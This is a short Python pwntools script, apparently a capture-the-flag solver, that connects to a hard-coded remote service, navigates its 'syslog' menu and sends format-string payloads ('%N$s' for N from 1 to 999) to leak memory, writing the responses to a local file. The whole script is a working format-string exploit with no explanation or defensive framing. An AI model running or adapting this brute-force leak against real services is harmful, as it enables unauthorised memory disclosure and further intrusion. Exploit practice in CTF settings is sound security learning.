# some ctf solver..?
from pwn import *

context(terminal=['tmux', 'splitw', '-h'])
#context.log_level = 'debug'

#io = gdb.debug("./syslog")

#elf = context.binary = ELF('./syslog',checksec=False)
#io = process(level='error')
#i = 0;



def fnc(value):
    io = remote("34.107.4.232", 31145)
    io.recvuntil(b'choice: ')
    io.sendline(b'1')
    io.recvuntil(b'etc.): ')
    io.sendline(b'1')
    io.recvuntil(b'syslog: ')
    
    io.sendline('%{}$s'.format(value).encode())
    try:
        print(io.recvuntil(b'choice: '))
    
        io.sendline(b'2')
        a1=io.recvline()
        a2=io.recvline()
        a3=io.recvline()
        a4=io.recvline()
        a5=io.recvline()
        f.write(str(a1)+'\n')
        f.write(str(a2)+'\n')
        f.write(str(a3)+'\n')
        f.write(str(a4)+'\n')
        f.write(str(a5)+'\n')

    except EOFError:
        pass
    io.close()

f = open("demofile2.txt", "a")
for i in range(1,1000):
    print(i)
    fnc(str(i))
f.close()